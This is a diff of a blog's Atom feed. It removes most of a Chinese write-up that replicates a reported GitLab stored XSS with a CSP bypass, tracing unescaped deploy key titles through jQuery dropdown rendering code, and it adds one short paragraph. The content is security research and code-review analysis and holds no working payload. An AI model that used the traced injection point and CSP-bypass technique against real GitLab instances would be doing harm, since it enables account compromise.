-    &lt;&lt;~HTML.chomp.html_safe
-        &lt;span
-        class="#{css_class}"
-        data-container="body"
-        data-html="true"
-        #{"style=\"background-color: #{bg_color}\"" if bg_color}
-        &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
-    HTML
-end
-</code></pre></div>    </div>
-    <p>果然后端是 html_safe 引发的问题。这样，变量中的 xss 代码就能够被嵌入了。</p>
-  </li>
-  <li>csp 绕过利用了前端 jquery 的漏洞，主要 gitlab 前端会扫描后端返回的 html 并且对某些标签进行 jquery 化的处理，很多漏洞都来源于这种机制。要绕过严格的 csp 不是简单的事情，但是 jquery 配合<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>html 注入，就可能够绕过 self 这样严格的限制。简直是最大的 bug，到 2023 年 11 月都没有修复。</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab CSP-bypass XSS in project settings page</title><link href="http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting.html" rel="alternate" type="text/html" title="Replication: Gitlab CSP-bypass XSS in project settings page" /><published>2023-11-01T10:31:06+08:00</published><updated>2023-11-01T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Gitlab CSP-bypass XSS in project settings page</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<blockquote>
-  <p>gitlab版本：14.5.2-ee</p>
-</blockquote>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/1588732">https://hackerone.com/reports/1588732</a></p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>gitlab前端jquery js渲染漏洞，js未对用户输入进行校验，而直接利用<code class="language-plaintext highlighter-rouge">${}</code>构造html，嵌入网页后触发xss</p>
-
-<h4 id="code-review">Code Review</h4>
-
-<h5 id="前端渲染部分">前端渲染部分</h5>
-
-<ol>
-  <li>
-    <p><em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#534</em></p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
-     const isActiveClass = isActive || '';
-     return `
-       &lt;li&gt;
-         &lt;a href="#" class="${isActiveClass}"&gt;
-           &lt;strong&gt;${key.title}&lt;/strong&gt;
-           &lt;p&gt;
-             ${sprintf(
-               __('Owned by %{image_tag}'),
-               {
-                 image_tag: `&lt;img src="${key.avatar_url}" class="avatar avatar-inline s26" width="30"&gt;`,
-               },
-               false,
-             )}
-             &lt;strong class="dropdown-menu-user-full-name gl-display-inline"&gt;${escape(
-               key.fullname,
-             )}&lt;/strong&gt;
-             &lt;span class="dropdown-menu-user-username gl-display-inline"&gt;${key.username}&lt;/span&gt;
-           &lt;/p&gt;
-         &lt;/a&gt;
-       &lt;/li&gt;
-     `;
-   }
-</code></pre></div>    </div>
-    <p>其中<code class="language-plaintext highlighter-rouge">key.title</code>没有过滤直接添加到html中。</p>
-  </li>
-  <li>
-    <p>该函数被<em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#29</em>行调用，进而定位到<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#396</em>。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderMenu(html) {
-     if (this.options.renderMenu) {
-       return this.options.renderMenu(html);
-     }
-     return $('&lt;ul&gt;').append(html);
-   }
-</code></pre></div>    </div>
-    <p>最终通过jquery进行直接渲染，从用户输入注入到html字符串中，到最终的渲染jquery的append函数，构成了完整的xss攻击。</p>
-  </li>
-</ol>
-
-<h5 id="后端存储部分">后端存储部分</h5>
-
-<ol>
-  <li>首先接受表单的输入，并且发送给后台，表单的创建通过rails默认的<code class="language-plaintext highlighter-rouge">form_for</code>完成，路径为：gitlab/app/views/admin/deploy_keys/new.html.haml</li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">form_for</code>的默认action为：如果实例未创建，那么默认为post方法创建实例；如果以创建，那么默认为更新post方法。注意到form_for没有对用户输入进行过滤。</p>
-
-    <p><img src="/assets/gitlab/1/formfor.png" alt="formfor" /></p>
-  </li>
-  <li>那么对于接受用户输入的前端，可以直接搜索form_for方法来进行定位.</li>
-  <li>对于后端接受post请求创建新实例的文件为：<em>gitlab/app/controllers/admin/deploy_keys_controller.rb</em>，对应到create方法，该方法调用了另一个create：<em>gitlab/app/services/deploy_keys/create_service.rb</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> module DeployKeys
-     class CreateService &lt; Keys::BaseService
-     def execute(project: nil)
-         DeployKey.create(params.merge(user: user))
-     end
-     end
- end
-</code></pre></div>    </div>
-  </li>
-  <li>Module DeployKey的create方法为内置方法，用于创建一个新的实例，可以看到该处也没有进行用户输入过滤。本来模型在变量定义时就会规定筛选动作，特别是对于应该合法的变量，但是本例中的变量title不应该被筛选，而类似上例中的color属性只能局限为某些颜色，为了防止用户输入随机值，所以采用了筛选机制，筛选机制是匹配失败则后端返回报错。</li>
-  <li>至此，从用户输入到存入后端数据库这一过程都没有进行输入过滤。接下来看一下拉取该输入到前端过程是否有过滤。</li>
-</ol>
-
-<h5 id="前端拉取数据部分">前端拉取数据部分</h5>
-
-<ol>
-  <li>定位到gl_dropdown.js负责对该下拉列表进行处理，逻辑是：前端对某些下拉菜单类进行jquery定位，然后对其进行拦截，注册监听click方法和相关的js动作，例如显示下拉菜单和网络请求</li>
-  <li>Gl_dropdown.js负责在用户点击下拉菜单时，请求后台数据，并且将返回的数据进行渲染。渲染的过程在本节的最开始已经分析。这里分析请求数据到渲染这一过程：
- a. 首先gl_dropdown.js执行opened(e)函数，然后执行this.remote.execute();获取后台数据</li>
-  <li>首先，请求数据的url不在DeployKey controller中，而是在另一个controller类中，该方法直接返回DeployKey模型的数据，在后端没有进行过滤，以json结构返回。</li>
-  <li>返回后，通过this.options.success方法对json数据进行渲染，并且请求体获取后没有对json对象的字段进行过滤。</li>
-  <li>至此，分析结束。不懂的是下来菜单如何挂载到后端渲染的网页上的，这是在前端的js脚本进行挂载的。</li>
-  <li>原始的显示部分对于keytitle是有过滤的，这一部分是后端渲染，默认使用haml的=会对之后的字符串进行escape，所以这里的后端渲染是安全的。</li>
-</ol>
-
-<h5 id="基于函数流分析">基于函数流分析</h5>
-
-<p>开始基于函数流和基于数据流的分析，基于数据流分析是因为函数流分析是模糊分析，数据流则更为细致。</p>
-
-<ol>
-  <li>函数parseData调用renderData，经由renderMenu，最终实现UI渲染：
- <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#238</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> parseData(data) {
-     let groupData;
-     let html;
-     this.renderedData = data;
-     if (this.options.filterable &amp;&amp; data.length === 0) {
-         // render no matching results
-         html = [this.noResults()];
-     }
-     // Handle array groups
-     else if (isObject(data)) {
-         this.renderData(groupData, name).map((item) =&gt; html.push(item));
-     });
-     } else {
-         // Render each row
-         html = this.renderData(data);
-     }
-     // Render the full menu
-     const fullHtml = this.renderMenu(html);
-     return this.appendMenu(fullHtml);
- }
-</code></pre></div>    </div>
-    <p><em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#396</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderMenu(html) {
-     if (this.options.renderMenu) {
-       return this.options.renderMenu(html);
-     }
-     return $('&lt;ul&gt;').append(html);
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>函数renderData负责传入数据进行渲染：
- <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#272</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderData(data, group) {
-     return data.map((obj, index) =&gt; this.renderItem(obj, group || false, index));
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>回到gl_dropdown.js文件，可以看到引用了render.js的默认item函数，并且将options传递，注意options包含renderRow函数的句柄：
-<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#428</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import renderItem from './render';
-   renderItem(data, group, index) {
-     return renderItem({
-       instance: this,
-       options: {
-         ...this.options,
-         icon: this.icon,
-       },
-       data,
-     });
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>在deprecated_jquery_dropdown文件夹中搜索renderRow关键字，定位到render.js文件调用了该函数，最终由默认函数item调用了renderRow函数：<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/render.js#150</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> function getOptionRenderer({ options, instance }) {
-   return options.renderRow &amp;&amp; ((li, data) =&gt; options.renderRow(data, instance));
- }
- function getRenderer(data, params) {
-   return renderersByType[data.type] || getOptionRenderer(params) || renderLink;
- }
- export default function item({ data, ...params }) {
-   const renderer = getRenderer(data, params);
-   const li = document.createElement('li');
-   if (shouldHide(data, params)) {
-     hideElement(li);
-   }
-   return renderer(li, data, params);
- }
-</code></pre></div>    </div>
-  </li>
-  <li>定位到initDeprecatedJQueryDropdown函数所在的文件，可以看到类被绑定到$dropdown元素中
- <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/index.js#8</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> export default function initDeprecatedJQueryDropdown($el, opts) {
-   // eslint-disable-next-line func-names
-   return $el.each(function () {
-     if (!$.data(this, 'deprecatedJQueryDropdown')) {
-       $.data(this, 'deprecatedJQueryDropdown', new GitLabDropdown(this, opts));
-     }
-   });
- }
-</code></pre></div>    </div>
-  </li>
-  <li>函数initDropdown中的函数initDeprecatedJQueryDropdown获取了renderRow函数的地址，当作句柄。
- <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#31</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> initDropdown() {
-     const { onSelect, onHide } = this.options;
-     initDeprecatedJQueryDropdown(this.$dropdown, {
-       data: this.getData.bind(this),
-       selectable: true,
-       filterable: true,
-       filterRemote: true,
-       multiSelect: this.$dropdown.hasClass('js-multiselect'),
-       renderRow: this.renderRow.bind(this),
-       toggleLabel: this.toggleLabel.bind(this),
-       hidden() {
-         if (onHide) {
-           onHide();
-         }
-       },
-</code></pre></div>    </div>
-  </li>
-  <li>函数renderRow引用了deployKeyRowHtml函数：
- <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#507</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderRow(item) {
-     let criteria = {};
-     let groupRowEl;
-     switch (item.type) {
-       case LEVEL_TYPES.DEPLOY_KEY:
-         groupRowEl =
-           this.accessLevel === ACCESS_LEVELS.PUSH ? this.deployKeyRowHtml(item, isActive) : '';
-         break;
-     }
-     return groupRowEl;
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>用regex定位到缺陷函数，key.title没有过滤，直接嵌入html中，从这里开始沿着执行流向下分析（往上），从而定位该html如何渲染到html页面
- <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#534</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
-     return `
-       &lt;li&gt;
-         &lt;a href="#" class="${isActiveClass}"&gt;
-           &lt;strong&gt;${key.title}&lt;/strong&gt;
-         &lt;/a&gt;
-       &lt;/li&gt;
-     `;
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>从这里开始沿着执行流向上分析（往下），为了确定该片段会在网站的哪个页面和组件出现。 从上面分析可以看到 this.$dropdown被传进了gl_dropdown并且最终渲染了漏洞代码，因此从$dropdown出发，看看它在哪里被赋值：类AccessDropdown的构造函数中options解构获取了$dropdown标签，那么就需要查询该类在何处实例化，只能够全局搜索？搜索该文件名access_dropdown，（注意导入js文件时可以不带js后缀名）查看其导入位置，有两处。
- <img src="/assets/gitlab/1/access_dropdown.png" alt="access_dropdown" /></p>
-
-    <p>分别是
- <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js</em>
- <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_edit.js</em>
- 首先分析第一个情况，可以看到$dropdown被赋值:
- <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js#71</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> buildDropdowns() {
-     // Allowed to merge dropdown
-     this[`${ACCESS_LEVELS.MERGE}_dropdown`] = new AccessDropdown({
-       accessLevel: ACCESS_LEVELS.MERGE,
-       accessLevelsData: gon.merge_access_levels,
-       $dropdown: this.$allowedToMergeDropdown,
-       onSelect: this.onSelectOption.bind(this),
-       onHide: this.onDropdownHide.bind(this),
-       hasLicense: this.hasLicense,
-     });
-     // Allowed to push dropdown
-     this[`${ACCESS_LEVELS.PUSH}_dropdown`] = new AccessDropdown({
-       accessLevel: ACCESS_LEVELS.PUSH,
-       accessLevelsData: gon.push_access_levels,
-       $dropdown: this.$allowedToPushDropdown,
-       onSelect: this.onSelectOption.bind(this),
-       onHide: this.onDropdownHide.bind(this),
-       hasLicense: this.hasLicense,
-     });
-   }
-</code></pre></div>    </div>
-  </li>
-  <li>继续分析该文件，可以看到$dropdown被初始化位置，也就是说.js-allowed-to-merge和.js-allowed-to-push就是被挂载的类：
-<em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js#15</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>constructor(options) {
-    this.hasLicense = options.hasLicense;
-    this.$wraps = {};
-    this.hasChanges = false;
-    this.$wrap = options.$wrap;
-    this.$allowedToMergeDropdown = this.$wrap.find('.js-allowed-to-merge');
-    this.$allowedToPushDropdown = this.$wrap.find('.js-allowed-to-push');
-    this.$forcePushToggle = this.$wrap.find('.js-force-push-toggle');
-    this.$codeOwnerToggle = this.$wrap.find('.js-code-owner-toggle');
-    this.$wraps[ACCESS_LEVELS.MERGE] = this.$allowedToMergeDropdown.closest(
-      `.${ACCESS_LEVELS.MERGE}-container`,
-    );
-    this.$wraps[ACCESS_LEVELS.PUSH] = this.$allowedToPushDropdown.closest(
-      `.${ACCESS_LEVELS.PUSH}-container`,
-    );
-    this.buildDropdowns();
-    this.bindEvents();
-  }
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>到此，被挂载的标签类已经确定，注意到rails一般是后端返回静态页面，而vue/js对静态页面的元素进行热更新，所以需要搜索rails的模板文件：
-<img src="/assets/gitlab/1/js-allowed-to-push.png" alt="js-allowed-to-push" /></p>
-
-    <p>可以看到，有两个rails模板文件包含该class名，分别是：
-<em>gitlab/app/views/projects/protected_branches/_create_protected_branch.html.haml</em>
-<em>gitlab/app/views/shared/projects/protected_branches/_update_protected_branch.html.haml</em>
-先考虑第一种情况：
-找对应的controller：projects/protected_branches_controller.rb 调用该视图，说明该视图很可能是被其他controller调用：</p>
-
-    <p><img src="/assets/gitlab/1/protected_branches_controller.png" alt="protected_branches_controller" /></p>
-
-    <p>分析视图名称，其中show是直接渲染的文件，而_index是局部渲染文件，用于被其他渲染文件调用，而show文件没有调用_index文件，_index文件调用了_create_protected_branch.html.haml，因此对该_index的调用进行分析。搜索: protected_branches/index，可以看到一处调用：<em>gitlab/app/views/projects/settings/repository/_protected_branches.html.haml</em></p>
-
-    <p><img src="/assets/gitlab/1/protected_branches1.png" alt="protected_branches1" /></p>
-
-    <p><img src="/assets/gitlab/1/protected_branches2.png" alt="protected_branches2" /></p>
-  </li>
-  <li>而projects/settings/repository_controller.rb调用了该show，自此，ui定位基本完成，只要访问projects/settings/repository路由即可。
-<em>gitlab/app/controllers/projects/settings/repository_controller.rb#63</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_show
-    define_variables
-    render 'show'
-end
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h5 id="基于数据流分析">基于数据流分析</h5>
-<ol>
-  <li>这一过程对什么数据会传输、存储和渲染进行分析，还是从初始点access_dropdown开始分析。
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
-     return `
-     &lt;li&gt;
-         &lt;a href="#" class="${isActiveClass}"&gt;
-         &lt;strong&gt;${key.title}&lt;/strong&gt;
-         &lt;/a&gt;
-     &lt;/li&gt;
-     `;
- }
-</code></pre></div>    </div>
-  </li>
-  <li>经过分析得到，该数据最终来自
- <em>gitlab/app/assets/javascripts/projects/settings/api/access_dropdown_api.js#35</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const DEPLOY_KEYS_PATH = '/-/autocomplete/deploy_keys_with_owners.json';
- export const getDeployKeys = (query) =&gt; {
- return axios.get(buildUrl(gon.relative_url_root || '', DEPLOY_KEYS_PATH), {
-     params: {
-     search: query,
-     per_page: 20,
-     active: true,
-     project_id: gon.current_project_id,
-     push_code: true,
-     },
- });
- };
-</code></pre></div>    </div>
-  </li>
-  <li>获取后端的路由，找到对应后端，直接从数据库Deploykey中取出，并返回：
- <em>gitlab/app/controllers/autocomplete_controller.rb#55</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   def deploy_keys_with_owners
-     deploy_keys = DeployKey.with_write_access_for_project(project)
-     render json: DeployKeySerializer.new.represent(deploy_keys, { with_owner: true, user: current_user })
-   end
-</code></pre></div>    </div>
-    <p>也就是说，漏洞UI渲染的是deploy_key数据，分析完毕。</p>
-  </li>
-</ol>
-
-<h4 id="tips">Tips</h4>
-
-<ul>
-  <li>
-    <p><strong>前端到后端</strong></p>
-
-    <p>一般前端负责对用户输入进行过滤，但是如果采用ruby的form_for方法渲染的静态页面，其中的action是固定的，而且也没有过滤操作。极其容易造成前端的数据没有过滤就给后端了。</p>
-  </li>
-  <li>
-    <p><strong>后端到前端</strong></p>
-
-    <p>数据是通过ruby的erb或者haml模型静态渲染，那么多半进行了过滤，因为这两个种模板默认对数据进行过滤。但是如果数据不是静态挂载，而是通过前端js获取，那么后端极有可能不会首先过滤，并且如果前端没有过滤，则xss出现。因此该xss出现在下拉菜单中就好说了，因为下拉菜单的数据往往是动态获取的，后端来静态渲染它们需要刷新页面。例如在同一个页面更新了数据，传入了后台。当显示的时候，我不可能刷新整个页面去显示那个数据，这时就需要通过api去拉取数据。</p>
-  </li>
-  <li>
-    <p><strong>后端的过滤</strong></p>
-
-    <p>后端的controller方法中，如果creat_params方法没有对数据进行过滤，那么后端很可能不会过滤。</p>
-  </li>
-</ul>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p>从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
